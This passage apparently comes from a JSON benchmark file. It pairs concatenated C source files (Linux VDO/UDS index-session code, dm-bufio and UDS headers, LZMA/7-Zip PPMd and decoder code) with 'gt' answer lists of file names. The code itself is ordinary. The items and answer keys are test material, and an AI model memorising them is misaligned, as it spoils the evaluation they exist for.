IS_FLAG_SUSPENDED);\n\tmutex_unlock(&index_session->request_mutex);\n\n\tif (!suspended) {\n\t\tresult = uds_save_index(index);\n\t\tif (result != UDS_SUCCESS)\n\t\t\tvdo_log_warning_strerror(result,\n\t\t\t\t\t\t \"ignoring error from save_index\");\n\t}\n\tuds_free_index(index);\n\tindex_session->index = NULL;\n\n\n\tmutex_lock(&index_session->load_context.mutex);\n\tindex_session->load_context.status = INDEX_OPENING;\n\tmutex_unlock(&index_session->load_context.mutex);\n\n\tmutex_lock(&index_session->request_mutex);\n\n\tindex_session->state &= IS_FLAG_SUSPENDED;\n\tmutex_unlock(&index_session->request_mutex);\n\n\treturn result;\n}\n\n\nint uds_close_index(struct uds_index_session *index_session)\n{\n\tint result = UDS_SUCCESS;\n\n\n\tmutex_lock(&index_session->request_mutex);\n\twhile ((index_session->state & IS_FLAG_WAITING) ||\n\t       (index_session->state & IS_FLAG_CLOSING)) {\n\t\tuds_wait_cond(&index_session->request_cond,\n\t\t\t      &index_session->request_mutex);\n\t}\n\n\tif (index_session->state & IS_FLAG_SUSPENDED) {\n\t\tvdo_log_info(\"Index session is suspended\");\n\t\tresult = -EBUSY;\n\t} else if ((index_session->state & IS_FLAG_DESTROYING) ||\n\t\t   !(index_session->state & IS_FLAG_LOADED)) {\n\n\t\tresult = UDS_NO_INDEX;\n\t} else {\n\t\tindex_session->state |= IS_FLAG_CLOSING;\n\t}\n\tmutex_unlock(&index_session->request_mutex);\n\tif (result != UDS_SUCCESS)\n\t\treturn uds_status_to_errno(result);\n\n\tvdo_log_debug(\"Closing index\");\n\twait_for_no_requests_in_progress(index_session);\n\tresult = save_and_free_index(index_session);\n\tvdo_log_debug(\"Closed index\");\n\n\tmutex_lock(&index_session->request_mutex);\n\tindex_session->state &= ~IS_FLAG_CLOSING;\n\tuds_broadcast_cond(&index_session->request_cond);\n\tmutex_unlock(&index_session->request_mutex);\n\treturn uds_status_to_errno(result);\n}\n\n\nint uds_destroy_index_session(struct uds_index_session *index_session)\n{\n\tint result;\n\tbool load_pending = false;\n\n\tvdo_log_debug(\"Destroying index session\");\n\n\n\tmutex_lock(&index_session->request_mutex);\n\twhile ((index_session->state & IS_FLAG_WAITING) ||\n\t       (index_session->state & IS_FLAG_CLOSING)) {\n\t\tuds_wait_cond(&index_session->request_cond,\n\t\t\t      &index_session->request_mutex);\n\t}\n\n\tif (index_session->state & IS_FLAG_DESTROYING) {\n\t\tmutex_unlock(&index_session->request_mutex);\n\t\tvdo_log_info(\"Index session is already closing\");\n\t\treturn -EBUSY;\n\t}\n\n\tindex_session->state |= IS_FLAG_DESTROYING;\n\tload_pending = ((index_session->state & IS_FLAG_LOADING) &&\n\t\t\t(index_session->state & IS_FLAG_SUSPENDED));\n\tmutex_unlock(&index_session->request_mutex);\n\n\tif (load_pending) {\n\n\t\tmutex_lock(&index_session->load_context.mutex);\n\t\tif (index_session->load_context.status == INDEX_SUSPENDED) {\n\t\t\tindex_session->load_context.status = INDEX_FREEING;\n\t\t\tuds_broadcast_cond(&index_session->load_context.cond);\n\t\t}\n\t\tmutex_unlock(&index_session->load_context.mutex);\n\n\n\t\tmutex_lock(&index_session->request_mutex);\n\t\twhile (index_session->state & IS_FLAG_LOADING) {\n\t\t\tuds_wait_cond(&index_session->request_cond,\n\t\t\t\t      &index_session->request_mutex);\n\t\t}\n\t\tmutex_unlock(&index_session->request_mutex);\n\t}\n\n\twait_for_no_requests_in_progress(index_session);\n\tresult = save_and_free_index(index_session);\n\tuds_request_queue_finish(index_session->callback_queue);\n\tindex_session->callback_queue = NULL;\n\tuds_destroy_cond(&index_session->load_context.cond);\n\tmutex_destroy(&index_session->load_context.mutex);\n\tuds_destroy_cond(&index_session->request_cond);\n\tmutex_destroy(&index_session->request_mutex);\n\tvdo_log_debug(\"Destroyed index session\");\n\tvdo_free(index_session);\n\treturn uds_status_to_errno(result);\n}\n\n\nint uds_flush_index_session(struct uds_index_session *index_session)\n{\n\twait_for_no_requests_in_progress(index_session);\n\tuds_wait_for_idle_index(index_session->index);\n\treturn UDS_SUCCESS;\n}\n\n\nstatic void collect_stats(const struct uds_index_session *index_session,\n\t\t\t  struct uds_index_stats *stats)\n{\n\tconst struct session_stats *session_stats = &index_session->stats;\n\n\tstats->current_time = ktime_to_seconds(current_time_ns(CLOCK_REALTIME));\n\tstats->posts_found = READ_ONCE(session_stats->posts_found);\n\tstats->in_memory_posts_found = READ_ONCE(session_stats->posts_found_open_chapter);\n\tstats->dense_posts_found = READ_ONCE(session_stats->posts_found_dense);\n\tstats->sparse_posts_found = READ_ONCE(session_stats->posts_found_sparse);\n\tstats->posts_not_found = READ_ONCE(session_stats->posts_not_found);\n\tstats->updates_found = READ_ONCE(session_stats->updates_found);\n\tstats->updates_not_found = READ_ONCE(session_stats->updates_not_found);\n\tstats->deletions_found = READ_ONCE(session_stats->deletions_found);\n\tstats->deletions_not_found = READ_ONCE(session_stats->deletions_not_found);\n\tstats->queries_found = READ_ONCE(session_stats->queries_found);\n\tstats->queries_not_found = READ_ONCE(session_stats->queries_not_found);\n\tstats->requests = READ_ONCE(session_stats->requests);\n}\n\nint uds_get_index_session_stats(struct uds_index_session *index_session,\n\t\t\t\tstruct uds_index_stats *stats)\n{\n\tif (stats == NULL) {\n\t\tvdo_log_error(\"received a NULL index stats pointer\");\n\t\treturn -EINVAL;\n\t}\n\n\tcollect_stats(index_session, stats);\n\tif (index_session->index != NULL) {\n\t\tuds_get_index_stats(index_session->index, stats);\n\t} else {\n\t\tstats->entries_indexed = 0;\n\t\tstats->memory_used = 0;\n\t\tstats->collisions = 0;\n\t\tstats->entries_discarded = 0;\n\t}\n\n\treturn UDS_SUCCESS;\n}\n\n'vdo/utils/uds/linux/dm-bufio.h'\n:\n\n#ifndef LINUX_DM_BUFIO_H\n#define LINUX_DM_BUFIO_H\n\n#include <linux/blkdev.h>\n\n\n\nstruct dm_bufio_client;\nstruct dm_buffer;\n\n\n#define DM_BUFIO_CLIENT_NO_SLEEP 0x1\n\nstruct dm_bufio_client *\ndm_bufio_client_create(struct block_device *bdev,\n\t\t       unsigned block_size,\n\t\t       unsigned reserved_buffers,\n\t\t       unsigned aux_size,\n\t\t       void (*alloc_callback)(struct dm_buffer *),\n\t\t       void (*write_callback)(struct dm_buffer *),\n\t\t       unsigned int flags);\n\nvoid dm_bufio_client_destroy(struct dm_bufio_client *client);\n\nvoid dm_bufio_set_sector_offset(struct dm_bufio_client *client,\n\t\t\t\tsector_t start);\n\nvoid *dm_bufio_new(struct dm_bufio_client *client,\n\t\t   sector_t block,\n\t\t   struct dm_buffer **buffer_ptr);\n\nvoid *dm_bufio_read(struct dm_bufio_client *client,\n\t\t    sector_t block,\n\t\t    struct dm_buffer **buffer_ptr);\n\nvoid dm_bufio_prefetch(struct dm_bufio_client *client,\n\t\t       sector_t block,\n\t\t       unsigned block_count);\n\nvoid dm_bufio_release(struct dm_buffer *buffer);\n\nvoid dm_bufio_release_move(struct dm_buffer *buffer, sector_t new_block);\n\nvoid dm_bufio_mark_buffer_dirty(struct dm_buffer *buffer);\n\nint dm_bufio_write_dirty_buffers(struct dm_bufio_client *client);\n\nvoid *dm_bufio_get_block_data(struct dm_buffer *buffer);\n\n#endif\n\n'vdo/utils/uds/index-layout.h'\n:\n\n\n#ifndef UDS_INDEX_LAYOUT_H\n#define UDS_INDEX_LAYOUT_H\n\n#include \"config.h\"\n#include \"indexer.h\"\n#include \"io-factory.h\"\n\n\n\nstruct index_layout;\n\nint __must_check uds_make_index_layout(struct uds_configuration *config, bool new_layout,\n\t\t\t\t       struct index_layout **layout_ptr);\n\nvoid uds_free_index_layout(struct index_layout *layout);\n\nint __must_check uds_replace_index_layout_storage(struct index_layout *layout,\n\t\t\t\t\t\t  struct block_device *bdev);\n\nint __must_check uds_load_index_state(struct index_layout *layout,\n\t\t\t\t      struct uds_index *index);\n\nint __must_check uds_save_index_state(struct index_layout *layout,\n\t\t\t\t      struct uds_index *index);\n\nint __must_check uds_discard_open_chapter(struct index_layout *layout);\n\nu64 __must_check uds_get_volume_nonce(struct index_layout *layout);\n\nint __must_check uds_open_volume_bufio(struct index_layout *layout, size_t block_size,\n\t\t\t\t       unsigned int reserved_buffers,\n\t\t\t\t       struct dm_bufio_client **client_ptr);\n\n#endif\n\n'vdo/utils/uds/io-factory.h'\n:\n\n\n#ifndef UDS_IO_FACTORY_H\n#define UDS_IO_FACTORY_H\n\n#include <linux/dm-bufio.h>\n\n\n\nstruct buffered_reader;\nstruct buffered_writer;\n\nstruct io_factory;\n\nenum {\n\tUDS_BLOCK_SIZE = 4096,\n\tSECTORS_PER_BLOCK = UDS_BLOCK_SIZE >> SECTOR_SHIFT,\n};\n\nint __must_check uds_make_io_factory(struct block_device *bdev,\n\t\t\t\t     struct io_factory **factory_ptr);\n\nint __must_check uds_replace_storage(struct io_factory *factory,\n\t\t\t\t     struct block_device *bdev);\n\nvoid uds_put_io_factory(struct io_factory *factory);\n\nsize_t __must_check uds_get_writable_size(struct io_factory *factory);\n\nint __must_check uds_make_bufio(struct io_factory *factory, off_t block_offset,\n\t\t\t\tsize_t block_size, unsigned int reserved_buffers,\n\t\t\t\tstruct dm_bufio_client **client_ptr);\n\nint __must_check uds_make_buffered_reader(struct io_factory *factory, off_t offset,\n\t\t\t\t\t  u64 block_count,\n\t\t\t\t\t  struct buffered_reader **reader_ptr);\n\nvoid uds_free_buffered_reader(struct buffered_reader *reader);\n\nint __must_check uds_read_from_buffered_reader(struct buffered_reader *reader, u8 *data,\n\t\t\t\t\t       size_t length);\n\nint __must_check uds_verify_buffered_data(struct buffered_reader *reader, const u8 *value,\n\t\t\t\t\t  size_t length);\n\nint __must_check uds_make_buffered_writer(struct io_factory *factory, off_t offset,\n\t\t\t\t\t  u64 block_count,\n\t\t\t\t\t  struct buffered_writer **writer_ptr);\n\nvoid uds_free_buffered_writer(struct buffered_writer *buffer);\n\nint __must_check uds_write_to_buffered_writer(struct buffered_writer *writer,\n\t\t\t\t\t      const u8 *data, size_t length);\n\nint __must_check uds_flush_buffered_writer(struct buffered_writer *writer);\n\n#endif\n",
        "gt": [
            "'vdo/utils/uds/linux/dm-bufio.h'",
            "'vdo/utils/uds/io-factory.h'",
            "'vdo/utils/uds/index-layout.h'",
            "'vdo/utils/uds/index-session.c'"
        ]
    },
    {
        "files": [
            "'TSF/include/lzma/Ppmd7.h'",
            "'TSF/src/lzma/7zDec.c'",
            "'TSF/include/lzma/Ppmd.h'",
            "'TSF/include/lzma/CpuArch.h'"
        ],
        "content": "'TSF/include/lzma/Ppmd7.h'\n:\n\n\n\n\n\n\n\n#ifndef __PPMD7_H\n\n#define __PPMD7_H\n\n\n\n#include \"Ppmd.h\"\n\n\n\nEXTERN_C_BEGIN\n\n\n\n#define PPMD7_MIN_ORDER 2\n\n#define PPMD7_MAX_ORDER 64\n\n\n\n#define PPMD7_MIN_MEM_SIZE (1 << 11)\n\n#define PPMD7_MAX_MEM_SIZE (0xFFFFFFFF - 12 * 3)\n\n\n\nstruct CPpmd7_Context_;\n\n\n\ntypedef\n\n  #ifdef PPMD_32BIT\n\n    struct CPpmd7_Context_ *\n\n  #else\n\n    UInt32\n\n  #endif\n\n  CPpmd7_Context_Ref;\n\n\n\ntypedef struct CPpmd7_Context_\n\n{\n\n  UInt16 NumStats;\n\n  UInt16 SummFreq;\n\n  CPpmd_State_Ref Stats;\n\n  CPpmd7_Context_Ref Suffix;\n\n} CPpmd7_Context;\n\n\n\n#define Ppmd7Context_OneState(p) ((CPpmd_State *)&(p)->SummFreq)\n\n\n\ntypedef struct\n\n{\n\n  CPpmd7_Context *MinContext, *MaxContext;\n\n  CPpmd_State *FoundState;\n\n  unsigned OrderFall, InitEsc, PrevSuccess, MaxOrder, HiBitsFlag;\n\n  Int32 RunLength, InitRL;\n\n\n\n  UInt32 Size;\n\n  UInt32 GlueCount;\n\n  Byte *Base, *LoUnit, *HiUnit, *Text, *UnitsStart;\n\n  UInt32 AlignOffset;\n\n\n\n  Byte Indx2Units[PPMD_NUM_INDEXES];\n\n  Byte Units2Indx[128];\n\n  CPpmd_Void_Ref FreeList[PPMD_NUM_INDEXES];\n\n  Byte NS2Indx[256], NS2BSIndx[256], HB2Flag[256];\n\n  CPpmd_See DummySee, See[25][16];\n\n  UInt16 BinSumm[128][64];\n\n} CPpmd7;\n\n\n\nvoid Ppmd7_Construct(CPpmd7 *p);\n\nBool Ppmd7_Alloc(CPpmd7 *p, UInt32 size, ISzAlloc *alloc);\n\nvoid Ppmd7_Free(CPpmd7 *p, ISzAlloc *alloc);\n\nvoid Ppmd7_Init(CPpmd7 *p, unsigned maxOrder);\n\n#define Ppmd7_WasAllocated(p) ((p)->Base != NULL)\n\n\n\n\n\n\n\n\n\nextern const Byte PPMD7_kExpEscape[16];\n\n\n\n#ifdef PPMD_32BIT\n\n  #define Ppmd7_GetPtr(p, ptr) (ptr)\n\n  #define Ppmd7_GetContext(p, ptr) (ptr)\n\n  #define Ppmd7_GetStats(p, ctx) ((ctx)->Stats)\n\n#else\n\n  #define Ppmd7_GetPtr(p, offs) ((void *)((p)->Base + (offs)))\n\n  #define Ppmd7_GetContext(p, offs) ((CPpmd7_Context *)Ppmd7_GetPtr((p), (offs)))\n\n  #define Ppmd7_GetStats(p, ctx) ((CPpmd_State *)Ppmd7_GetPtr((p), ((ctx)->Stats)))\n\n#endif\n\n\n\nvoid Ppmd7_Update1(CPpmd7 *p);\n\nvoid Ppmd7_Update1_0(CPpmd7 *p);\n\nvoid Ppmd7_Update2(CPpmd7 *p);\n\nvoid Ppmd7_UpdateBin(CPpmd7 *p);\n\n\n\n#define Ppmd7_GetBinSumm(p) \\\n\n    &p->BinSumm[(unsigned)Ppmd7Context_OneState(p->MinContext)->Freq - 1][p->PrevSuccess + \\\n\n    p->NS2BSIndx[Ppmd7_GetContext(p, p->MinContext->Suffix)->NumStats - 1] + \\\n\n    (p->HiBitsFlag = p->HB2Flag[p->FoundState->Symbol]) + \\\n\n    2 * p->HB2Flag[(unsigned)Ppmd7Context_OneState(p->MinContext)->Symbol] + \\\n\n    ((p->RunLength >> 26) & 0x20)]\n\n\n\nCPpmd_See *Ppmd7_MakeEscFreq(CPpmd7 *p, unsigned numMasked, UInt32 *scale);\n\n\n\n\n\n\n\n\n\ntypedef struct\n\n{\n\n  UInt32 (*GetThreshold)(void *p, UInt32 total);\n\n  void (*Decode)(void *p, UInt32 start, UInt32 size);\n\n  UInt32 (*DecodeBit)(void *p, UInt32 size0);\n\n} IPpmd7_RangeDec;\n\n\n\ntypedef struct\n\n{\n\n  IPpmd7_RangeDec p;\n\n  UInt32 Range;\n\n  UInt32 Code;\n\n  IByteIn *Stream;\n\n} CPpmd7z_RangeDec;\n\n\n\nvoid Ppmd7z_RangeDec_CreateVTable(CPpmd7z_RangeDec *p);\n\nBool Ppmd7z_RangeDec_Init(CPpmd7z_RangeDec *p);\n\n#define Ppmd7z_RangeDec_IsFinishedOK(p) ((p)->Code == 0)\n\n\n\nint Ppmd7_DecodeSymbol(CPpmd7 *p, IPpmd7_RangeDec *rc);\n\n\n\n\n\n\n\n\n\ntypedef struct\n\n{\n\n  UInt64 Low;\n\n  UInt32 Range;\n\n  Byte Cache;\n\n  UInt64 CacheSize;\n\n  IByteOut *Stream;\n\n} CPpmd7z_RangeEnc;\n\n\n\nvoid Ppmd7z_RangeEnc_Init(CPpmd7z_RangeEnc *p);\n\nvoid Ppmd7z_RangeEnc_FlushData(CPpmd7z_RangeEnc *p);\n\n\n\nvoid Ppmd7_EncodeSymbol(CPpmd7 *p, CPpmd7z_RangeEnc *rc, int symbol);\n\n\n\nEXTERN_C_END\n\n\n\n#endif\n\n\n'TSF/src/lzma/7zDec.c'\n:\n\n\n\n#include <lzma/Precomp.h>\n\n\n\n#include <string.h>\n\n\n\n\n\n\n\n#include <lzma/7z.h>\n\n#include <lzma/7zCrc.h>\n\n\n\n#include <lzma/Bcj2.h>\n\n#include <lzma/Bra.h>\n\n#include <lzma/CpuArch.h>\n\n#include <lzma/Delta.h>\n\n#include <lzma/LzmaDec.h>\n\n#include <lzma/Lzma2Dec.h>\n\n#ifdef _7ZIP_PPMD_SUPPPORT\n\n#include <lzma/Ppmd7.h>\n\n#endif\n\n\n\n#define k_Copy 0\n\n#define k_Delta 3\n\n#define k_LZMA2 0x21\n\n#define k_LZMA  0x30101\n\n#define k_BCJ   0x3030103\n\n#define k_BCJ2  0x303011B\n\n#define k_PPC   0x3030205\n\n#define k_IA64  0x3030401\n\n#define k_ARM   0x3030501\n\n#define k_ARMT  0x3030701\n\n#define k_SPARC 0x3030805\n\n\n\n\n\n#ifdef _7ZIP_PPMD_SUPPPORT\n\n\n\n#define k_PPMD 0x30401\n\n\n\ntypedef struct\n\n{\n\n  IByteIn p;\n\n  const Byte *cur;\n\n  const Byte *end;\n\n  const Byte *begin;\n\n  UInt64 processed;\n\n  Bool extra;\n\n  SRes res;\n\n  ILookInStream *inStream;\n\n} CByteInToLook;\n\n\n\nstatic Byte ReadByte(void *pp)\n\n{\n\n  CByteInToLook *p = (CByteInToLook *)pp;\n\n  if (p->cur != p->end)\n\n    return *p->cur++;\n\n  if (p->res == SZ_OK)\n\n  {\n\n    size_t size = p->cur - p->begin;\n\n    p->processed += size;\n\n    p->res = p->inStream->Skip(p->inStream, size);\n\n    size = (1 << 25);\n\n    p->res = p->inStream->Look(p->inStream, (const void **)&p->begin, &size);\n\n    p->cur = p->begin;\n\n    p->end = p->begin + size;\n\n    if (size != 0)\n\n      return *p->cur++;;\n\n  }\n\n  p->extra = True;\n\n  return 0;\n\n}\n\n\n\nstatic SRes SzDecodePpmd(const Byte *props, unsigned propsSize, UInt64 inSize, ILookInStream *inStream,\n\n    Byte *outBuffer, SizeT outSize, ISzAlloc *allocMain)\n\n{\n\n  CPpmd7 ppmd;\n\n  CByteInToLook s;\n\n  SRes res = SZ_OK;\n\n\n\n  s.p.Read = ReadByte;\n\n  s.inStream = inStream;\n\n  s.begin = s.end = s.cur = NULL;\n\n  s.extra = False;\n\n  s.res = SZ_OK;\n\n  s.processed = 0;\n\n\n\n  if (propsSize != 5)\n\n    return SZ_ERROR_UNSUPPORTED;\n\n\n\n  {\n\n    unsigned order = props[0];\n\n    UInt32 memSize = GetUi32(props + 1);\n\n    if (order < PPMD7_MIN_ORDER ||\n\n        order > PPMD7_MAX_ORDER ||\n\n        memSize < PPMD7_MIN_MEM_SIZE ||\n\n        memSize > PPMD7_MAX_MEM_SIZE)\n\n      return SZ_ERROR_UNSUPPORTED;\n\n    Ppmd7_Construct(&ppmd);\n\n    if (!Ppmd7_Alloc(&ppmd, memSize, allocMain))\n\n      return SZ_ERROR_MEM;\n\n    Ppmd7_Init(&ppmd, order);\n\n  }\n\n  {\n\n    CPpmd7z_RangeDec rc;\n\n    Ppmd7z_RangeDec_CreateVTable(&rc);\n\n    rc.Stream = &s.p;\n\n    if (!Ppmd7z_RangeDec_Init(&rc))\n\n      res = SZ_ERROR_DATA;\n\n    else if (s.extra)\n\n      res = (s.res != SZ_OK ? s.res : SZ_ERROR_DATA);\n\n    else\n\n    {\n\n      SizeT i;\n\n      for (i = 0; i < outSize; i++)\n\n      {\n\n        int sym = Ppmd7_DecodeSymbol(&ppmd, &rc.p);\n\n        if (s.extra || sym < 0)\n\n          break;\n\n        outBuffer[i] = (Byte)sym;\n\n      }\n\n      if (i != outSize)\n\n        res = (s.res != SZ_OK ? s.res : SZ_ERROR_DATA);\n\n      else if (s.processed + (s.cur - s.begin) != inSize || !Ppmd7z_RangeDec_IsFinishedOK(&rc))\n\n        res = SZ_ERROR_DATA;\n\n    }\n\n  }\n\n  Ppmd7_Free(&ppmd, allocMain);\n\n  return res;\n\n}\n\n\n\n#endif\n\n\n\n\n\nstatic SRes SzDecodeLzma(const Byte *props, unsigned propsSize, UInt64 inSize, ILookInStream *inStream,\n\n    Byte *outBuffer, SizeT outSize, ISzAlloc *allocMain)\n\n{\n\n  CLzmaDec state;\n\n  SRes res = SZ_OK;\n\n\n\n  LzmaDec_Construct(&state);\n\n  RINOK(LzmaDec_AllocateProbs(&state, props, propsSize, allocMain));\n\n  state.dic = outBuffer;\n\n  state.dicBufSize = outSize;\n\n  LzmaDec_Init(&state);\n\n\n\n  for (;;)\n\n  {\n\n    const void *inBuf = NULL;\n\n    size_t lookahead = (1 << 18);\n\n    if (lookahead > inSize)\n\n      lookahead = (size_t)inSize;\n\n    res = inStream->Look(inStream, &inBuf, &lookahead);\n\n    if (res != SZ_OK)\n\n      break;\n\n\n\n    {\n\n      SizeT inProcessed = (SizeT)lookahead, dicPos = state.dicPos;\n\n      ELzmaStatus status;\n\n      res = LzmaDec_DecodeToDic(&state, outSize, inBuf, &inProcessed, LZMA_FINISH_END, &status);\n\n      lookahead -= inProcessed;\n\n      inSize -= inProcessed;\n\n      if (res != SZ_OK)\n\n        break;\n\n\n\n      if (status == LZMA_STATUS_FINISHED_WITH_MARK)\n\n      {\n\n        if (outSize != state.dicPos || inSize != 0)\n\n          res = SZ_ERROR_DATA;\n\n        break;\n\n      }\n\n\n\n      if (outSize == state.dicPos && inSize == 0 && status == LZMA_STATUS_MAYBE_FINISHED_WITHOUT_MARK)\n\n        break;\n\n\n\n      if (inProcessed == 0 && dicPos == state.dicPos)\n\n      {\n\n        res = SZ_ERROR_DATA;\n\n        break;\n\n      }\n\n\n\n      res = inStream->Skip((void *)inStream, inProcessed);\n\n      if (res != SZ_OK)\n\n        break;\n\n    }\n\n  }\n\n\n\n  LzmaDec_FreeProbs(&state, allocMain);\n\n  return res;\n\n}\n\n\n\n\n\n#ifndef _7Z_NO_METHOD_LZMA2\n\n\n\nstatic SRes SzDecodeLzma2(const Byte *props, unsigned propsSize, UInt64 inSize, ILookInStream *inStream,\n\n    Byte *outBuffer, SizeT outSize, ISzAlloc *allocMain)\n\n{\n\n  CLzma2Dec state;\n\n  SRes res = SZ_OK;\n\n\n\n  Lzma2Dec_Construct(&state);\n\n  if (propsSize != 1)\n\n    return SZ_ERROR_DATA;\n\n  RINOK(Lzma2Dec_AllocateProbs(&state, props[0], allocMain));\n\n  state.decoder.dic = outBuffer;\n\n  state.decoder.dicBufSize = outSize;\n\n  Lzma2Dec_Init(&state);\n\n\n\n  for (;;)\n\n  {\n\n    const void *inBuf = NULL;\n\n    size_t lookahead = (1 << 18);\n\n    if (lookahead > inSize)\n\n      lookahead = (size_t)inSize;\n\n    res = inStream->Look(inStream, &inBuf, &lookahead);\n\n    if (res != SZ_OK)\n\n      break;\n\n\n\n    {\n\n      SizeT inProcessed = (SizeT)lookahead, dicPos = state.decoder.dicPos;\n\n      ELzmaStatus status;\n\n      res = Lzma2Dec_DecodeToDic(&state, outSize, inBuf, &inProcessed, LZMA_FINISH_END, &status);\n\n      lookahead -= inProcessed;\n\n      inSize -= inProcessed;\n\n      if (res != SZ_OK)\n\n        break;\n\n\n\n      if (status == LZMA_STATUS_FINISHED_WITH_MARK)\n\n      {\n\n        if (outSize != state.decoder.dicPos || inSize != 0)\n\n          res = SZ_ERROR_DATA;\n\n        break;\n\n      }\n\n\n\n      if (inProcessed == 0 && dicPos == state.decoder.dicPos)\n\n      {\n\n        res = SZ_ERROR_DATA;\n\n        break;\n\n      }\n\n\n\n      res = inStream->Skip((void *)inStream, inProcessed);\n\n      if (res != SZ_OK)\n\n        break;\n\n    }\n\n  }\n\n\n\n  Lzma2Dec_FreeProbs(&state, allocMain);\n\n  return res;\n\n}\n\n\n\n#endif\n\n\n\n\n\nstatic SRes SzDecodeCopy(UInt64 inSize, ILookInStream *inStream, Byte *outBuffer)\n\n{\n\n  while (inSize > 0)\n\n  {\n\n    const void *inBuf;\n\n    size_t curSize = (1 << 18);\n\n    if (curSize > inSize)\n\n      curSize = (size_t)inSize;\n\n    RINOK(inStream->Look(inStream, &inBuf, &curSize));\n\n    if (curSize == 0)\n\n      return SZ_ERROR_INPUT_EOF;\n\n    memcpy(outBuffer, inBuf, curSize);\n\n    outBuffer += curSize;\n\n    inSize -= curSize;\n\n    RINOK(inStream->Skip((void *)inStream, curSize));\n\n  }\n\n  return SZ_OK;\n\n}\n\n\n\nstatic Bool IS_MAIN_METHOD(UInt32 m)\n\n{\n\n  switch (m)\n\n  {\n\n    case k_Copy:\n\n    case k_LZMA:\n\n    #ifndef _7Z_NO_METHOD_LZMA2\n\n    case k_LZMA2:\n\n    #endif\n\n    #ifdef _7ZIP_PPMD_SUPPPORT\n\n    case k_PPMD:\n\n    #endif\n\n      return True;\n\n  }\n\n  return False;\n\n}\n\n\n\nstatic Bool IS_SUPPORTED_CODER(const CSzCoderInfo *c)\n\n{\n\n  return\n\n      c->NumStreams == 1\n\n\n\n      && IS_MAIN_METHOD((UInt32)c->MethodID);\n\n}\n\n\n\n#define IS_BCJ2(c) ((c)->MethodID == k_BCJ2 && (c)->NumStreams == 4)\n\n\n\nstatic SRes CheckSupportedFolder(const CSzFolder *f)\n\n{\n\n  if (f->NumCoders < 1 || f->NumCoders > 4)\n\n    return SZ_ERROR_UNSUPPORTED;\n\n  if (!IS_SUPPORTED_CODER(&f->Coders[0]))\n\n    return SZ_ERROR_UNSUPPORTED;\n\n  if (f->NumCoders == 1)\n\n  {\n\n    if (f->NumPackStreams != 1 || f->PackStreams[0] != 0 || f->NumBonds != 0)\n\n      return SZ_ERROR_UNSUPPORTED;\n\n    return SZ_OK;\n\n  }\n\n\n\n\n\n  #ifndef _7Z_NO_METHODS_FILTERS\n\n\n\n  if (f->NumCoders == 2)\n\n  {\n\n    const CSzCoderInfo *c = &f->Coders[1];\n\n    if (\n\n\n\n        c->NumStreams != 1\n\n        || f->NumPackStreams != 1\n\n        || f->PackStreams[0] != 0\n\n        || f->NumBonds != 1\n\n        || f->Bonds[0].InIndex != 1\n\n        || f->Bonds[0].OutIndex != 0)\n\n      return SZ_ERROR_UNSUPPORTED;\n\n    switch ((UInt32)c->MethodID)\n\n    {\n\n      case k_Delta:\n\n      case k_BCJ:\n\n      case k_PPC:\n\n      case k_IA64:\n\n      case k_SPARC:\n\n      case k_ARM:\n\n      case k_ARMT:\n\n        break;\n\n      default:\n\n        return SZ_ERROR_UNSUPPORTED;\n\n    }\n\n    return SZ_OK;\n\n  }\n\n\n\n  #endif\n\n\n\n\n\n  if (f->NumCoders == 4)\n\n  {\n\n    if (!IS_SUPPORTED_CODER(&f->Coders[1])\n\n        || !IS_SUPPORTED_CODER(&f->Coders[2])\n\n        || !IS_BCJ2(&f->Coders[3]))\n\n      return SZ_ERROR_UNSUPPORTED;\n\n    if (f->NumPackStreams != 4\n\n        || f->PackStreams[0] != 2\n\n        || f->PackStreams[1] != 6\n\n        || f->PackStreams[2] != 1\n\n        || f->PackStreams[3] != 0\n\n        || f->NumBonds != 3\n\n        || f->Bonds[0].InIndex != 5 || f->Bonds[0].OutIndex != 0\n\n        || f->Bonds[1].InIndex != 4 || f->Bonds[1].OutIndex != 1\n\n        || f->Bonds[2].InIndex != 3 || f->Bonds[2].OutIndex != 2)\n\n      return SZ_ERROR_UNSUPPORTED;\n\n    return SZ_OK;\n\n  }\n\n\n\n  return SZ_ERROR_UNSUPPORTED;\n\n}\n\n\n\n#define CASE_BRA_CONV(isa) case k_ ## isa: isa ## _Convert(outBuffer, outSize, 0, 0); break;\n\n\n\nstatic SRes SzFolder_Decode2(const CSzFolder *folder,\n\n    const Byte *propsData,\n\n    const UInt64 *unpackSizes,\n\n    const UInt64 *packPositions,\n\n    ILookInStream *inStream, UInt64 startPos,\n\n    Byte *outBuffer, SizeT outSize, ISzAlloc *allocMain,\n\n    Byte *tempBuf[])\n\n{\n\n  UInt32 ci;\n\n  SizeT tempSizes[3] = { 0, 0, 0};\n\n  SizeT tempSize3 = 0;\n\n  Byte *tempBuf3 = 0;\n\n\n\n  RINOK(CheckSupportedFolder(folder));\n\n\n\n  for (ci = 0; ci < folder->NumCoders; ci++)\n\n  {\n\n    const CSzCoderInfo *coder = &folder->Coders[ci];\n\n\n\n    if (IS_MAIN_METHOD((UInt32)coder->MethodID))\n\n    {\n\n      UInt32 si = 0;\n\n      UInt64 offset;\n\n      UInt64 inSize;\n\n      Byte *outBufCur = outBuffer;\n\n      SizeT outSizeCur = outSize;\n\n      if (folder->NumCoders == 4)\n\n      {\n\n        UInt32 indices[] = { 3, 2, 0 };\n\n        UInt64 unpackSize = unpackSizes[ci];\n\n        si = indices[ci];\n\n        if (ci < 2)\n\n        {\n\n          Byte *temp;\n\n          outSizeCur = (SizeT)unpackSize;\n\n          if (outSizeCur != unpackSize)\n\n            return SZ_ERROR_MEM;\n\n          temp = (Byte *)IAlloc_Alloc(allocMain, outSizeCur);\n\n          if (!temp && outSizeCur != 0)\n\n            return SZ_ERROR_MEM;\n\n          outBufCur = tempBuf[1 - ci] = temp;\n\n          tempSizes[1 - ci] = outSizeCur;\n\n        }\n\n        else if (ci == 2)\n\n        {\n\n          if (unpackSize > outSize)\n\n            return SZ_ERROR_PARAM;\n\n          tempBuf3 = outBufCur = outBuffer + (outSize - (size_t)unpackSize);\n\n          tempSize3 = outSizeCur = (SizeT)unpackSize;\n\n        }\n\n        else\n\n          return SZ_ERROR_UNSUPPORTED;\n\n      }\n\n      offset = packPositions[si];\n\n      inSize = packPositions[si + 1] - offset;\n\n      RINOK(LookInStream_SeekTo(inStream, startPos + offset));\n\n\n\n      if (coder->MethodID == k_Copy)\n\n      {\n\n        if (inSize != outSizeCur)\n\n          return SZ_ERROR_DATA;\n\n        RINOK(SzDecodeCopy(inSize, inStream, outBufCur));\n\n      }\n\n      else if (coder->MethodID == k_LZMA)\n\n      {\n\n        RINOK(SzDecodeLzma(propsData + coder->PropsOffset, coder->PropsSize, inSize, 